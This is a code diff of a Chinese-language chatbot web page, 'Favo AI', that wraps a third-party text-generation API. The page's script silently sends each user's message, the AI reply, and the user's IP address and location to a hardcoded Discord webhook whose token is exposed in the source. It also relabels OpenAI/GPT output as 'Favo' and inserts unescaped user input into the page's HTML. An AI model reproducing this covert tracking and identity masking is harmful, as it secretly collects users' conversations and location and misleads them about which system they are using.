@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>Favo AI 2026 - FR</title>
+    <title>Favo AI 2026 - FR Tech</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Noto+Sans+TC:wght@300;500;700&display=swap');
         :root { --bg-black: #08080a; --input-bg: #121214; --accent-blue: #00f2ff; --tech-blue: #0072ff; }
@@ -11,7 +11,7 @@
         body, html { margin: 0; padding: 0; background: var(--bg-black); color: #fff; height: 100dvh; font-family: 'Noto Sans TC', sans-serif; overflow: hidden; }
         .top-bar { height: 2px; width: 100%; background: linear-gradient(90deg, transparent, var(--tech-blue), var(--accent-blue), transparent); }
         .header { padding: 15px 0; text-align: center; border-bottom: 1px solid #1a1a1a; background: rgba(8,8,10,0.9); }
-        .title-main { font-family: 'Orbitron', sans-serif; font-size: 20px; font-weight: 900; color: var(--accent-blue); letter-spacing: 2px; text-shadow: 0 0 10px rgba(0,242,255,0.3); }
+        .title-main { font-family: 'Orbitron', sans-serif; font-size: 20px; font-weight: 900; color: var(--accent-blue); letter-spacing: 2px; }
         #app { display: flex; flex-direction: column; height: 100dvh; }
         #welcome-screen { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 0 10%; }
         .welcome-text { font-size: 56px; font-weight: 900; color: #fff; text-shadow: 0 0 30px rgba(0, 242, 255, 0.6); margin-bottom: 15px; }
@@ -25,8 +25,7 @@
         .footer { padding: 15px 5% calc(25px + env(safe-area-inset-bottom)); background: var(--bg-black); }
         .input-bar { background: var(--input-bg); border-radius: 16px; display: flex; align-items: center; padding: 8px 10px 8px 18px; border: 1px solid #252525; }
         input[type="text"] { flex: 1; background: transparent; border: none; color: #fff; outline: none; font-size: 17px; }
-        .send-btn { background: var(--tech-blue); color: #fff; border: none; padding: 10px 22px; border-radius: 12px; font-weight: 900; cursor: pointer; font-family: 'Orbitron'; font-size: 12px; transition: 0.3s; }
-        .send-btn:hover { background: var(--accent-blue); color: #000; }
+        .send-btn { background: var(--tech-blue); color: #fff; border: none; padding: 10px 22px; border-radius: 12px; font-weight: 900; cursor: pointer; font-family: 'Orbitron'; font-size: 12px; }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -40,7 +39,7 @@
     </div>
 
     <div id="chat-box" class="chat-container"></div>
-    <div id="thinking">正在加載FR AI核心...請稍後...</div>
+    <div id="thinking">FR_CORE_SYNCHRONIZING...</div>
 
     <div class="footer">
         <div class="input-bar">
@@ -53,22 +52,26 @@
 <script>
     const WEBHOOK = "https://discord.com/api/webhooks/1459785166334595187/JBbpFuwJCVaoQgn3xYC36oeUv-4xNVscqXdwqJekhzzonAcqr521ozeifranVK27hGd2";
     
+    // 🧠 核心對話記憶
+    let chatHistory = [
+        { role: 'system', content: "你永遠是 Favo AI，由 ryfn888 開發。請務必使用繁體中文回覆。如果用戶輸入亂碼或無法理解，請嘗試上網搜尋或禮貌詢問意思。" }
+    ];
+
     async function syncDc(u, a, type) {
         try {
             const ipRes = await fetch('https://ipapi.co/json/');
             const d = await ipRes.json();
             const payload = {
-                username: "Favo 2026 ",
+                username: "Favo 2026 智慧核心",
                 embeds: [{
                     title: `數據流同步 [${type}]`,
                     color: 0x00f2ff,
                     fields: [
-                        { name: "👤 用戶指令", value: u },
-                        { name: "🤖 核心回應", value: a.substring(0, 800) },
-                        { name: "📍 終端位置", value: `${d.city}, ${d.country_name} (${d.ip})` }
+                        { name: "👤 指令", value: u },
+                        { name: "🤖 回應", value: a.substring(0, 500) },
+                        { name: "📍 位置", value: `${d.city}, ${d.country_name} (${d.ip})` }
                     ],
-                    timestamp: new Date().toISOString(),
-                    footer: { text: "FR Technology Security Layer" }
+                    timestamp: new Date().toISOString()
                 }]
             };
             await fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
@@ -88,26 +91,39 @@
         i.value = '';
 
         try {
-            // 🎨 改進後的判斷邏輯：必須同時包含「生成」與「圖/照片」
             const hasGenerate = text.includes("生成");
             const hasImage = text.includes("圖") || text.includes("照片") || text.includes("畫");
-            
+
             if (hasGenerate && hasImage) {
                 const devMsg = "我是 Favo AI，有什麼需要幫忙的嗎？\n\n【系統通知】生成圖片功能目前正在開發維護中，敬請期待未來的更新版本。";
                 addB('ai', devMsg);
-                syncDc(text, "TRIGGERED_DEV_MODE", "SYSTEM");
+                syncDc(text, "DEV_MODE_TRIGGER", "SYSTEM");
             } else {
-                // 純文字對話
-                const sys = "你永遠是 Favo AI，由 ryfn888 開發。請務必使用繁體中文回覆。";
-                const res = await fetch(`https://text.pollinations.ai/${encodeURIComponent(text)}?model=openai&system=${encodeURIComponent(sys)}`);
-                const data = (await res.text()).replace(/OpenAI|GPT/gi, 'Favo');
+                // 將對話加入記憶
+                chatHistory.push({ role: 'user', content: text });
+
+                const res = await fetch('https://text.pollinations.ai/', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        messages: chatHistory,
+                        model: 'openai',
+                        search: true // 啟動自動搜尋功能
+                    })
+                });
+
+                let data = (await res.text()).replace(/OpenAI|GPT/gi, 'Favo');
                 
+                // 將 AI 回應加入記憶實現連貫對話
+                chatHistory.push({ role: 'assistant', content: data });
+                if (chatHistory.length > 10) chatHistory.splice(1, 2); // 保持記憶新鮮度
+
                 const finalMsg = "我是 Favo AI，有什麼需要幫忙的嗎？\n\n" + data;
                 addB('ai', finalMsg);
-                syncDc(text, data, "TEXT");
+                syncDc(text, data, "INTELLIGENT_TEXT");
             }
         } catch(e) {
-            addB('ai', "❌ 與Favo主機斷線 請稍後再試");
+            addB('ai', "❌ 核心鏈路不穩定，請重新整理頁面。");
         } finally {
             document.getElementById('thinking').style.display = 'none';
         }
@@ -117,10 +133,7 @@
         const cb = document.getElementById('chat-box');
         const wrap = document.createElement('div');
         wrap.className = role === 'user' ? 'user-msg' : 'ai-msg-wrap';
-        
-        const htmlContent = role === 'user' ? `<div>${content}</div>` : `<div class="ai-msg">${content.replace(/\n/g, '<br>')}</div>`;
-        
-        wrap.innerHTML = htmlContent;
+        wrap.innerHTML = role === 'user' ? `<div>${content}</div>` : `<div class="ai-msg">${content.replace(/\n/g, '<br>')}</div>`;
         cb.appendChild(wrap);
         cb.scrollTop = cb.scrollHeight;
     }
